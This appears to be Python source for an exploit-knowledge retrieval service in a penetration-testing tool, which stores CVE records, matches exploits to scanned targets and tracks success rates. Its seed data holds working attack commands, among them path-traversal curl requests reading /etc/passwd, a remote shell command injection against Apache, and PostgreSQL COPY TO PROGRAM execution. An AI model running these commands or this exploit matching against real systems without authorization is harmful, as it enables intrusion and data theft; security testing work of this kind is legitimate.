"""
Enhanced RAG Service for Exploit Knowledge Management
Stores real CVE/exploit data, learns from scan results, and provides intelligent recommendations
"""
import chromadb
from chromadb.config import Settings
from sentence_transformers import SentenceTransformer
from typing import List, Dict, Any, Optional
import json
import os
import threading
from datetime import datetime
import logging
from services.ai.config import ai_config

logger = logging.getLogger(__name__)


class ExploitRAGService:
    """
    Retrieval-Augmented Generation service for exploit knowledge management.
    Stores CVEs, exploits, PoC results, and learns from successful attacks.
    """

    _instance = None
    _lock = threading.Lock()
    _initialized = False

    def __new__(cls, *args, **kwargs):
        """Singleton pattern to ensure only one instance."""
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(
        self,
        persist_directory: str = "./services/ai/databases/exploit_knowledge",
        collection_name: str = "exploit_knowledge",
        embedding_model: str = ai_config.embedding_model
    ):
        # Only initialize once
        if self._initialized:
            return

        with self._lock:
            if self._initialized:
                return

            self.persist_directory = persist_directory
            self.collection_name = collection_name
            self.embedding_model_name = embedding_model

            # These will be initialized lazily
            self.embedding_model = None
            self.client = None
            self.collection = None
            self.fallback_mode = False

            self._initialized = True
            logger.info("ExploitRAGService initialized (lazy loading enabled)")

    def _ensure_initialized(self):
        """Lazy initialization of heavy components."""
        if self.fallback_mode:
            return  # Already tried and failed

        if self.client is not None and self.embedding_model is not None:
            return

        with self._lock:
            # Double-check after acquiring lock
            if self.fallback_mode:
                return

            if self.client is not None and self.embedding_model is not None:
                return

            try:
                # Initialize embedding model (using smaller model for faster loading)
                if self.embedding_model is None:
                    logger.info(f"Loading embedding model: {self.embedding_model_name}")
                    self.embedding_model = SentenceTransformer(self.embedding_model_name)
                    logger.info("✓ Embedding model loaded successfully")

                # Initialize ChromaDB client
                if self.client is None:
                    logger.info(f"Initializing ChromaDB at: {self.persist_directory}")
                    os.makedirs(self.persist_directory, exist_ok=True)

                    try:
                        # Try persistent client first
                        self.client = chromadb.PersistentClient(
                            path=self.persist_directory,
                            settings=Settings(
                                anonymized_telemetry=False,
                                allow_reset=True
                        )
                        )
                        logger.info("✓ ChromaDB persistent client initialized")
                    except Exception as persist_error:
                        logger.warning(f"Persistent client failed, using in-memory client: {persist_error}")
                        # Fallback to in-memory client
                        self.client = chromadb.Client(
                            settings=Settings(
                                anonymized_telemetry=False,
                                allow_reset=True
                            )
                        )
                        logger.info("✓ ChromaDB in-memory client initialized")

                # Get or create collection
                if self.collection is None:
                    try:
                        self.collection = self.client.get_collection(name=self.collection_name)
                        count = self.collection.count()
                        logger.info(f"✓ Loaded existing collection with {count} exploits")
                    except:
                        self.collection = self.client.create_collection(
                            name=self.collection_name,
                            metadata={"description": "CVE exploits and PoC execution results"}
                        )
                        logger.info("✓ Created new exploit knowledge collection")
                        self._populate_real_exploit_data()

            except Exception as e:
                logger.error(f"✗ Error initializing RAG service: {e}", exc_info=True)
                logger.warning("✓ Falling back to rule-based mode (RAG disabled)")
                self.fallback_mode = True

    def _populate_real_exploit_data(self):
        """Populate with real CVE and exploit data."""
        if self.fallback_mode:
            return

        # Real exploit data based on actual CVEs
        exploit_data = [
            # Apache exploits
            {
                "id": "CVE-2021-41773",
                "cve_id": "CVE-2021-41773",
                "service": "Apache HTTP Server",
                "versions": ["2.4.49", "2.4.50"],
                "os": ["Linux", "Unix"],
                "severity": "critical",
                "cvss_score": 7.5,
                "exploit_type": "Path Traversal",
                "description": "Apache HTTP Server 2.4.49 and 2.4.50 path traversal and RCE vulnerability. Allows reading arbitrary files and potential RCE.",
                "exploit_urls": [
                    "https://github.com/blasty/CVE-2021-41773",
                    "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-41773.yaml"
                ],
                "exploitdb_id": "50383",
                "poc_available": True,
                "poc_commands": [
                    "curl 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
                    "curl 'http://TARGET/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd'"
                ],
                "success_indicators": ["/bin/bash", "root:", "/etc/passwd"],
                "attack_complexity": "low",
                "requires_auth": False,
                "success_count": 0,
                "attempt_count": 0
            },
            {
                "id": "CVE-2021-42013",
                "cve_id": "CVE-2021-42013",
                "service": "Apache HTTP Server",
                "versions": ["2.4.49", "2.4.50"],
                "os": ["Linux", "Unix"],
                "severity": "critical",
                "cvss_score": 9.8,
                "exploit_type": "Path Traversal + RCE",
                "description": "Apache HTTP Server 2.4.49 and 2.4.50 RCE via path traversal. Improved exploit for CVE-2021-41773.",
                "exploit_urls": [
                    "https://github.com/Zeop-CyberSec/apache_normalize_path",
                    "https://github.com/blasty/CVE-2021-42013"
                ],
                "exploitdb_id": "50406",
                "poc_available": True,
                "poc_commands": [
                    "curl 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'",
                    "curl -d 'echo; id' 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'"
                ],
                "success_indicators": ["uid=", "gid=", "root:", "/etc/passwd"],
                "attack_complexity": "low",
                "requires_auth": False,
                "success_count": 0,
                "attempt_count": 0
            },

            # IIS exploits
            {
                "id": "CVE-2017-7269",
                "cve_id": "CVE-2017-7269",
                "service": "Microsoft IIS",
                "versions": ["6.0"],
                "os": ["Windows Server 2003"],
                "severity": "critical",
                "cvss_score": 9.3,
                "exploit_type": "Buffer Overflow + RCE",
                "description": "Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl buffer overflow leading to RCE.",
                "exploit_urls": [
                    "https://github.com/edwardz246003/IIS_exploit",
                    "https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269"
                ],
                "exploitdb_id": "41738",
                "poc_available": True,
                "poc_commands": [
                    "python exploit.py TARGET 80"
                ],
                "success_indicators": ["shell", "cmd.exe", "SYSTEM"],
                "attack_complexity": "medium",
                "requires_auth": False,
                "success_count": 0,
                "attempt_count": 0
            },

            # SSH exploits
            {
                "id": "CVE-2018-15473",
                "cve_id": "CVE-2018-15473",
                "service": "OpenSSH",
                "versions": ["<7.8"],
                "os": ["Linux", "Unix"],
                "severity": "medium",
                "cvss_score": 5.3,
                "exploit_type": "User Enumeration",
                "description": "OpenSSH user enumeration vulnerability. Allows attackers to determine valid usernames.",
                "exploit_urls": [
                    "https://github.com/Sait-Nuri/CVE-2018-15473",
                    "https://github.com/epi052/cve-2018-15473"
                ],
                "exploitdb_id": "45233",
                "poc_available": True,
                "poc_commands": [
                    "python sshUsernameEnumExploit.py --host TARGET --port 22 --userList users.txt"
                ],
                "success_indicators": ["valid", "exists", "found"],
                "attack_complexity": "low",
                "requires_auth": False,
                "success_count": 0,
                "attempt_count": 0
            },

            # MySQL exploits
            {
                "id": "CVE-2016-6662",
                "cve_id": "CVE-2016-6662",
                "service": "MySQL",
                "versions": ["<5.7.15", "<5.6.33", "<5.5.52"],
                "os": ["Linux", "Unix", "Windows"],
                "severity": "critical",
                "cvss_score": 9.0,
                "exploit_type": "Configuration File Injection + RCE",
                "description": "MySQL remote root code execution via configuration file injection.",
                "exploit_urls": [
                    "https://github.com/Ashrafdev/MySQL-Remote-Root-Code-Execution-CVE-2016-6662-",
                    "https://www.exploit-db.com/exploits/40360"
                ],
                "exploitdb_id": "40360",
                "poc_available": True,
                "poc_commands": [
                    "python mysql_hookandroot_lib.py TARGET 3306 USERNAME PASSWORD"
                ],
                "success_indicators": ["shell", "root", "success"],
                "attack_complexity": "high",
                "requires_auth": True,
                "success_count": 0,
                "attempt_count": 0
            },

            # Tomcat exploits
            {
                "id": "CVE-2020-1938",
                "cve_id": "CVE-2020-1938",
                "service": "Apache Tomcat",
                "versions": ["6", "7", "8", "9"],
                "os": ["Linux", "Unix", "Windows"],
                "severity": "critical",
                "cvss_score": 9.8,
                "exploit_type": "Ghostcat - AJP File Read/Inclusion",
                "description": "Apache Tomcat AJP protocol vulnerability (Ghostcat). Allows reading webapp files and RCE via file inclusion.",
                "exploit_urls": [
                    "https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",
                    "https://github.com/00theway/Ghostcat-CNVD-2020-10487"
                ],
                "exploitdb_id": "48143",
                "poc_available": True,
                "poc_commands": [
                    "python tomcat-ajp.py TARGET -p 8009 -f WEB-INF/web.xml"
                ],
                "success_indicators": ["web-app", "servlet", "<?xml"],
                "attack_complexity": "low",
                "requires_auth": False,
                "success_count": 0,
                "attempt_count": 0
            },

            # nginx exploits
            {
                "id": "CVE-2017-7529",
                "cve_id": "CVE-2017-7529",
                "service": "nginx",
                "versions": ["0.5.6", "1.13.2"],
                "os": ["Linux", "Unix"],
                "severity": "high",
                "cvss_score": 7.5,
                "exploit_type": "Integer Overflow + Information Disclosure",
                "description": "nginx range filter integer overflow leading to information disclosure and potential RCE.",
                "exploit_urls": [
                    "https://github.com/ine-labs/CVE-2017-7529",
                    "https://www.exploit-db.com/exploits/42537"
                ],
                "exploitdb_id": "42537",
                "poc_available": True,
                "poc_commands": [
                    "python nginx_exploit.py TARGET"
                ],
                "success_indicators": ["memory", "leaked", "bytes"],
                "attack_complexity": "medium",
                "requires_auth": False,
                "success_count": 0,
                "attempt_count": 0
            },

            # FTP exploits
            {
                "id": "CVE-2015-3306",
                "cve_id": "CVE-2015-3306",
                "service": "ProFTPD",
                "versions": ["1.3.5"],
                "os": ["Linux", "Unix"],
                "severity": "critical",
                "cvss_score": 10.0,
                "exploit_type": "Remote Code Execution",
                "description": "ProFTPD mod_copy arbitrary file copy leading to RCE.",
                "exploit_urls": [
                    "https://github.com/t0kx/exploit-CVE-2015-3306",
                    "https://www.exploit-db.com/exploits/36803"
                ],
                "exploitdb_id": "36803",
                "poc_available": True,
                "poc_commands": [
                    "python proftpd_exploit.py TARGET"
                ],
                "success_indicators": ["copied", "success", "shell"],
                "attack_complexity": "low",
                "requires_auth": False,
                "success_count": 0,
                "attempt_count": 0
            },

            # SMB exploits
            {
                "id": "MS17-010",
                "cve_id": "CVE-2017-0144",
                "service": "Microsoft SMB",
                "versions": ["SMBv1"],
                "os": ["Windows 7", "Windows Server 2008", "Windows Server 2012", "Windows 8", "Windows 10"],
                "severity": "critical",
                "cvss_score": 9.3,
                "exploit_type": "EternalBlue - Remote Code Execution",
                "description": "Microsoft SMB Remote Code Execution (EternalBlue). Used in WannaCry ransomware.",
                "exploit_urls": [
                    "https://github.com/3ndG4me/AutoBlue-MS17-010",
                    "https://github.com/worawit/MS17-010"
                ],
                "exploitdb_id": "42031",
                "poc_available": True,
                "poc_commands": [
                    "python eternal_blue.py TARGET",
                    "python eternalblue_exploit7.py TARGET"
                ],
                "success_indicators": ["shell", "SYSTEM", "nt authority"],
                "attack_complexity": "medium",
                "requires_auth": False,
                "success_count": 0,
                "attempt_count": 0
            },

            # PostgreSQL exploits
            {
                "id": "CVE-2019-9193",
                "cve_id": "CVE-2019-9193",
                "service": "PostgreSQL",
                "versions": ["9.3", "9.4", "9.5", "9.6", "10", "11"],
                "os": ["Linux", "Unix", "Windows"],
                "severity": "high",
                "cvss_score": 7.2,
                "exploit_type": "Arbitrary Command Execution",
                "description": "PostgreSQL COPY TO/FROM PROGRAM arbitrary command execution.",
                "exploit_urls": [
                    "https://github.com/sqrtZeroKnowledge/CVE-2019-9193",
                    "https://www.exploit-db.com/exploits/46813"
                ],
                "exploitdb_id": "46813",
                "poc_available": True,
                "poc_commands": [
                    "psql -h TARGET -U postgres -c \"COPY (SELECT '') to PROGRAM 'id'\""
                ],
                "success_indicators": ["uid=", "gid=", "postgres"],
                "attack_complexity": "low",
                "requires_auth": True,
                "success_count": 0,
                "attempt_count": 0
            }
        ]

        try:
            ids = [item["id"] for item in exploit_data]

            # Create rich text descriptions for embedding
            documents = []
            for item in exploit_data:
                doc = f"""CVE: {item['cve_id']}
Service: {item['service']} {', '.join(item['versions'])}
OS: {', '.join(item['os'])}
Type: {item['exploit_type']}
Severity: {item['severity']} (CVSS {item['cvss_score']})
Description: {item['description']}
Attack Complexity: {item['attack_complexity']}
Requires Auth: {item['requires_auth']}"""
                documents.append(doc)

            # Prepare metadata (ChromaDB metadata must be simple types)
            metadatas = []
            for item in exploit_data:
                meta = {
                    "cve_id": item["cve_id"],
                    "service": item["service"],
                    "versions": json.dumps(item["versions"]),
                    "os": json.dumps(item["os"]),
                    "severity": item["severity"],
                    "cvss_score": item["cvss_score"],
                    "exploit_type": item["exploit_type"],
                    "requires_auth": item["requires_auth"],
                    "attack_complexity": item["attack_complexity"],
                    "poc_available": item["poc_available"],
                    "exploit_urls": json.dumps(item["exploit_urls"]),
                    "poc_commands": json.dumps(item["poc_commands"]),
                    "success_indicators": json.dumps(item["success_indicators"]),
                    "success_count": item["success_count"],
                    "attempt_count": item["attempt_count"],
                    "exploitdb_id": item.get("exploitdb_id", "")
                }
                metadatas.append(meta)

            # Generate embeddings
            embeddings = self.embedding_model.encode(documents).tolist()

            # Add to collection
            self.collection.add(
                ids=ids,
                documents=documents,
                metadatas=metadatas,
                embeddings=embeddings
            )
            logger.info(f"✓ Added {len(exploit_data)} real CVE exploits to knowledge base")

        except Exception as e:
            logger.error(f"✗ Error populating exploit data: {e}", exc_info=True)

    def find_matching_exploits(
        self,
        service: str,
        version: str = "",
        os: str = "",
        n_results: int = 10
    ) -> List[Dict[str, Any]]:
        """
        Find exploits matching the target service, version, and OS.
        This is the KEY method for smart exploit matching.
        """
        if self.fallback_mode:
            return []

        self._ensure_initialized()

        if self.fallback_mode:
            return []

        try:
            # Build query string
            query_parts = [service]
            if version:
                query_parts.append(version)
            if os:
                query_parts.append(os)

            query = " ".join(query_parts)

            logger.info(f"Searching exploits for: {query}")

            # Query ChromaDB
            query_embedding = self.embedding_model.encode([query])[0].tolist()
            results = self.collection.query(
                query_embeddings=[query_embedding],
                n_results=n_results
            )

            # Parse results
            exploits = []
            if results and results['ids']:
                for i in range(len(results['ids'][0])):
                    metadata = results['metadatas'][0][i]

                    # Parse JSON fields back
                    exploit = {
                        'id': results['ids'][0][i],
                        'cve_id': metadata['cve_id'],
                        'service': metadata['service'],
                        'versions': json.loads(metadata['versions']),
                        'os': json.loads(metadata['os']),
                        'severity': metadata['severity'],
                        'cvss_score': metadata['cvss_score'],
                        'exploit_type': metadata['exploit_type'],
                        'requires_auth': metadata['requires_auth'],
                        'attack_complexity': metadata['attack_complexity'],
                        'poc_available': metadata['poc_available'],
                        'exploit_urls': json.loads(metadata['exploit_urls']),
                        'poc_commands': json.loads(metadata['poc_commands']),
                        'success_indicators': json.loads(metadata['success_indicators']),
                        'success_count': metadata['success_count'],
                        'attempt_count': metadata['attempt_count'],
                        'exploitdb_id': metadata.get('exploitdb_id', ''),
                        'description': results['documents'][0][i],
                        'similarity_score': 1 - results['distances'][0][i] if 'distances' in results else 0.5
                    }

                    # Filter by version compatibility
                    if version and exploit['versions']:
                        version_match = any(v in version or version in v for v in exploit['versions'])
                        if version_match:
                            exploit['version_match'] = True
                            exploits.append(exploit)
                    else:
                        exploit['version_match'] = False
                        exploits.append(exploit)

                    # Filter by OS compatibility
                    if os and exploit['os']:
                        os_match = any(o.lower() in os.lower() or os.lower() in o.lower() for o in exploit['os'])
                        exploit['os_match'] = os_match
                    else:
                        exploit['os_match'] = True

            # Sort by relevance: version_match > os_match > similarity_score > success_rate
            def exploit_score(exp):
                score = 0
                if exp.get('version_match'):
                    score += 100
                if exp.get('os_match'):
                    score += 50
                score += exp.get('similarity_score', 0) * 20
                if exp['attempt_count'] > 0:
                    success_rate = exp['success_count'] / exp['attempt_count']
                    score += success_rate * 30
                return score

            exploits.sort(key=exploit_score, reverse=True)

            logger.info(f"Found {len(exploits)} matching exploits")
            return exploits

        except Exception as e:
            logger.error(f"✗ Error finding matching exploits: {e}", exc_info=True)
            return []

    def record_exploit_attempt(self, exploit_id: str, target: str, success: bool, execution_details: Dict[str, Any]):
        """
        Record exploit execution attempt and update success statistics.
        This enables learning from scan results.
        """
        if self.fallback_mode:
            return

        self._ensure_initialized()

        if self.fallback_mode:
            return

        try:
            # Get current exploit data
            result = self.collection.get(ids=[exploit_id])

            if result and result['ids']:
                metadata = result['metadatas'][0]

                # Update counters
                attempt_count = metadata.get('attempt_count', 0) + 1
                success_count = metadata.get('success_count', 0)
                if success:
                    success_count += 1

                # Update metadata
                metadata['attempt_count'] = attempt_count
                metadata['success_count'] = success_count

                # Update in ChromaDB
                self.collection.update(
                    ids=[exploit_id],
                    metadatas=[metadata]
                )

                success_rate = (success_count / attempt_count * 100) if attempt_count > 0 else 0
                logger.info(f"✓ Recorded exploit attempt: {exploit_id} | Success: {success} | Success Rate: {success_rate:.1f}%")

                # Store detailed execution log
                self._store_execution_log(exploit_id, target, success, execution_details)

        except Exception as e:
            logger.error(f"✗ Error recording exploit attempt: {e}", exc_info=True)

    def _store_execution_log(self, exploit_id: str, target: str, success: bool, details: Dict[str, Any]):
        """Store detailed execution log for analysis."""
        try:
            log_dir = os.path.join(self.persist_directory, "execution_logs")
            os.makedirs(log_dir, exist_ok=True)

            log_entry = {
                "timestamp": datetime.now().isoformat(),
                "exploit_id": exploit_id,
                "target": target,
                "success": success,
                "details": details
            }

            log_file = os.path.join(log_dir, f"{exploit_id}_log.jsonl")
            with open(log_file, 'a') as f:
                f.write(json.dumps(log_entry) + "\n")

        except Exception as e:
            logger.error(f"Error storing execution log: {e}")

    def add_custom_exploit(self, exploit_data: Dict[str, Any], added_by: str = "user"):
        """
        Human interface: Add custom exploit knowledge to the database.
        """
        if self.fallback_mode:
            logger.warning("Cannot add exploit in fallback mode")
            return False

        self._ensure_initialized()

        if self.fallback_mode:
            return False

        try:
            # Validate required fields
            required_fields = ['cve_id', 'service', 'versions', 'os', 'description']
            for field in required_fields:
                if field not in exploit_data:
                    raise ValueError(f"Missing required field: {field}")

            exploit_id = exploit_data.get('id', exploit_data['cve_id'])

            # Build document for embedding
            doc = f"""CVE: {exploit_data['cve_id']}
Service: {exploit_data['service']} {', '.join(exploit_data['versions'])}
OS: {', '.join(exploit_data['os'])}
Description: {exploit_data['description']}
Added by: {added_by}"""

            # Prepare metadata
            metadata = {
                "cve_id": exploit_data['cve_id'],
                "service": exploit_data['service'],
                "versions": json.dumps(exploit_data['versions']),
                "os": json.dumps(exploit_data['os']),
                "severity": exploit_data.get('severity', 'unknown'),
                "cvss_score": exploit_data.get('cvss_score', 0.0),
                "exploit_type": exploit_data.get('exploit_type', 'unknown'),
                "requires_auth": exploit_data.get('requires_auth', False),
                "attack_complexity": exploit_data.get('attack_complexity', 'unknown'),
                "poc_available": exploit_data.get('poc_available', False),
                "exploit_urls": json.dumps(exploit_data.get('exploit_urls', [])),
                "poc_commands": json.dumps(exploit_data.get('poc_commands', [])),
                "success_indicators": json.dumps(exploit_data.get('success_indicators', [])),
                "success_count": 0,
                "attempt_count": 0,
                "exploitdb_id": exploit_data.get('exploitdb_id', ''),
                "added_by": added_by,
                "added_at": datetime.now().isoformat()
            }

            # Generate embedding
            embedding = self.embedding_model.encode([doc])[0].tolist()

            # Add to collection
            self.collection.add(
                ids=[exploit_id],
                documents=[doc],
                metadatas=[metadata],
                embeddings=[embedding]
            )

            logger.info(f"✓ Added custom exploit: {exploit_id} by {added_by}")
            return True

        except Exception as e:
            logger.error(f"✗ Error adding custom exploit: {e}", exc_info=True)
            return False

    def get_exploit_statistics(self) -> Dict[str, Any]:
        """Get statistics about stored exploits."""
        if self.fallback_mode:
            return {"status": "fallback_mode", "total_exploits": 0}

        self._ensure_initialized()

        if self.fallback_mode:
            return {"status": "fallback_mode", "total_exploits": 0}

        try:
            total_count = self.collection.count()

            # Get all metadata to calculate stats
            all_data = self.collection.get()

            total_attempts = 0
            total_successes = 0
            severity_counts = {}
            service_counts = {}

            if all_data and all_data['metadatas']:
                for meta in all_data['metadatas']:
                    total_attempts += meta.get('attempt_count', 0)
                    total_successes += meta.get('success_count', 0)

                    severity = meta.get('severity', 'unknown')
                    severity_counts[severity] = severity_counts.get(severity, 0) + 1

                    service = meta.get('service', 'unknown')
                    service_counts[service] = service_counts.get(service, 0) + 1

            overall_success_rate = (total_successes / total_attempts * 100) if total_attempts > 0 else 0

            return {
                "status": "active",
                "total_exploits": total_count,
                "total_attempts": total_attempts,
                "total_successes": total_successes,
                "overall_success_rate": round(overall_success_rate, 2),
                "severity_distribution": severity_counts,
                "service_distribution": service_counts
            }

        except Exception as e:
            logger.error(f"Error getting exploit statistics: {e}")
            return {"status": "error", "error": str(e)}

    def reset_collection(self):
        """Reset the collection and repopulate with initial data."""
        if self.fallback_mode:
            return

        self._ensure_initialized()

        if self.fallback_mode:
            return

        try:
            self.client.delete_collection(name=self.collection_name)
            self.collection = self.client.create_collection(
                name=self.collection_name,
                metadata={"description": "CVE exploits and PoC execution results"}
            )
            self._populate_real_exploit_data()
            logger.info("✓ Collection reset and repopulated")
        except Exception as e:
            logger.error(f"✗ Error resetting collection: {e}")


# ============================================================================
# Knowledge Base Vulnerability Management
# ============================================================================

def add_kb_vulnerability_to_rag(kb_vulnerability):
    """
    Add a knowledge base vulnerability entry to RAG for intelligent matching.

    Args:
        kb_vulnerability: KnowledgeBaseVulnerability model instance
    """
    try:
        from services.ai.config import ai_config

        # Initialize a separate collection for KB vulnerabilities
        kb_rag = KnowledgeBaseRAGService(
            persist_directory=ai_config.chroma_persist_directory,
            collection_name="knowledge_base_vulnerabilities"
        )
        kb_rag._ensure_initialized()

        if kb_rag.fallback_mode:
            logger.warning("Cannot add KB vulnerability to RAG in fallback mode")
            return

        # Build document for embedding
        doc = f"""Name: {kb_vulnerability.name}
Description: {kb_vulnerability.description}
Severity: {kb_vulnerability.severity}
Category: {kb_vulnerability.category or 'N/A'}
CVE: {kb_vulnerability.cve_id or 'N/A'}
CWE: {kb_vulnerability.cwe_id or 'N/A'}
Remediation: {kb_vulnerability.remediation or 'N/A'}"""

        # Prepare metadata
        metadata = {
            "kb_id": kb_vulnerability.id,
            "name": kb_vulnerability.name,
            "severity": kb_vulnerability.severity,
            "category": kb_vulnerability.category or "",
            "cve_id": kb_vulnerability.cve_id or "",
            "cwe_id": kb_vulnerability.cwe_id or "",
            "priority": kb_vulnerability.priority,
            "is_active": kb_vulnerability.is_active,
            "version": kb_vulnerability.version
        }

        # Generate embedding
        embedding = kb_rag.embedding_model.encode([doc])[0].tolist()

        # Add to collection
        kb_rag.collection.add(
            ids=[f"kb_{kb_vulnerability.id}"],
            documents=[doc],
            metadatas=[metadata],
            embeddings=[embedding]
        )

        logger.info(f"✓ Added KB vulnerability to RAG: {kb_vulnerability.name} (ID: {kb_vulnerability.id})")

    except Exception as e:
        logger.error(f"✗ Error adding KB vulnerability to RAG: {e}", exc_info=True)


def update_kb_vulnerability_in_rag(kb_vulnerability):
    """
    Update a knowledge base vulnerability entry in RAG.

    Args:
        kb_vulnerability: Updated KnowledgeBaseVulnerability model instance
    """
    try:
        # Remove old entry and add updated one
        remove_kb_vulnerability_from_rag(kb_vulnerability.id)
        add_kb_vulnerability_to_rag(kb_vulnerability)

        logger.info(f"✓ Updated KB vulnerability in RAG: {kb_vulnerability.name} (ID: {kb_vulnerability.id})")

    except Exception as e:
        logger.error(f"✗ Error updating KB vulnerability in RAG: {e}", exc_info=True)


def remove_kb_vulnerability_from_rag(kb_id: int):
    """
    Remove a knowledge base vulnerability entry from RAG.

    Args:
        kb_id: Knowledge base vulnerability ID
    """
    try:
        from services.ai.config import ai_config

        kb_rag = KnowledgeBaseRAGService(
            persist_directory=ai_config.chroma_persist_directory,
            collection_name="knowledge_base_vulnerabilities"
        )
        kb_rag._ensure_initialized()

        if kb_rag.fallback_mode:
            return

        # Delete from collection
        kb_rag.collection.delete(ids=[f"kb_{kb_id}"])

        logger.info(f"✓ Removed KB vulnerability from RAG: ID {kb_id}")

    except Exception as e:
        logger.error(f"✗ Error removing KB vulnerability from RAG: {e}", exc_info=True)


def search_similar_vulnerabilities(query_text: str, top_k: int = 5) -> List[Dict[str, Any]]:
    """
    Search for similar vulnerabilities in the knowledge base using RAG.

    Args:
        query_text: The text to search for (finding description/title)
        top_k: Number of results to return

    Returns:
        List of matching KB entries with similarity scores
    """
    try:
        from services.ai.config import ai_config

        kb_rag = KnowledgeBaseRAGService(
            persist_directory=ai_config.chroma_persist_directory,
            collection_name="knowledge_base_vulnerabilities"
        )
        kb_rag._ensure_initialized()

        if kb_rag.fallback_mode:
            return []

        # Generate query embedding
        query_embedding = kb_rag.embedding_model.encode([query_text])[0].tolist()

        # Search in collection
        results = kb_rag.collection.query(
            query_embeddings=[query_embedding],
            n_results=top_k,
            where={"is_active": True}  # Only search active entries
        )

        # Parse results
        matches = []
        if results and results['ids']:
            for i in range(len(results['ids'][0])):
                metadata = results['metadatas'][0][i]
                distance = results['distances'][0][i] if 'distances' in results else 0.0
                similarity_score = 1 - distance  # Convert distance to similarity

                matches.append({
                    'kb_id': metadata['kb_id'],
                    'name': metadata['name'],
                    'severity': metadata['severity'],
                    'category': metadata['category'],
                    'cve_id': metadata['cve_id'],
                    'cwe_id': metadata['cwe_id'],
                    'priority': metadata['priority'],
                    'similarity_score': similarity_score,
                    'document': results['documents'][0][i]
                })

        # Sort by priority and similarity
        matches.sort(key=lambda x: (x['priority'], x['similarity_score']), reverse=True)

        logger.info(f"Found {len(matches)} similar KB vulnerabilities for query")
        return matches

    except Exception as e:
        logger.error(f"✗ Error searching similar vulnerabilities: {e}", exc_info=True)
        return []


class KnowledgeBaseRAGService(ExploitRAGService):
    """
    Specialized RAG service for Knowledge Base vulnerabilities.
    Inherits from ExploitRAGService but uses a separate collection.
    """

    def __init__(
        self,
        persist_directory: str = "./services/ai/databases/knowledge_rag",
        collection_name: str = "knowledge_base_vulnerabilities",
        embedding_model: str = ai_config.embedding_model
    ):
        # Don't call parent __init__ to avoid singleton issues
        self.persist_directory = persist_directory
        self.collection_name = collection_name
        self.embedding_model_name = embedding_model

        self.embedding_model = None
        self.client = None
        self.collection = None
        self.fallback_mode = False

        logger.info(f"KnowledgeBaseRAGService initialized for collection: {collection_name}")


# Factory function for lazy initialization
def get_exploit_rag_service():
    """Get or create ExploitRAGService instance with lazy initialization."""
    try:
        from services.ai.config import ai_config
        service = ExploitRAGService(
            persist_directory=ai_config.chroma_persist_directory,
            collection_name="exploit_knowledge",
        )
    except:
        # Fallback if config doesn't exist
        service = ExploitRAGService()

    return service


# Global instance
_global_rag_service = None


def init_exploit_rag_service():
    """Initialize RAG service when needed."""
    global _global_rag_service
    if _global_rag_service is None:
        _global_rag_service = get_exploit_rag_service()
    return _global_rag_service
